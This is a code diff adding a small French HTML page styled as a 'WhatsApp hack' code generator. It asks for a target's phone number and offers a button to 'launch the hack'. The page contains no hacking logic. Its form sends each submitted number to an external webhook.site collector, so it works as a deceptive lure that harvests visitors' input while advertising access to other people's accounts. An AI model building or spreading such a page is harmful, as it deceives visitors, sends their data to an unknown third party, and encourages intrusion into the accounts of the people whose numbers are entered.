@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>WhatsApp Hack Simulation</title>
+</head>
+<body style="text-align: center; font-family: sans-serif;">
+  <h2>Générateur de code WhatsApp 2025</h2>
+  <p>Entrez le numéro cible :</p>
+  <form method="POST" action="https://webhook.site/b9f721df-4883-411d-812a-a57a3fd1e879">
+    <input type="text" name="whatsapp_number" placeholder="Numéro WhatsApp" required><br><br>
+    <button type="submit">Lancer le piratage</button>
+  </form>
+</body>
+</html>
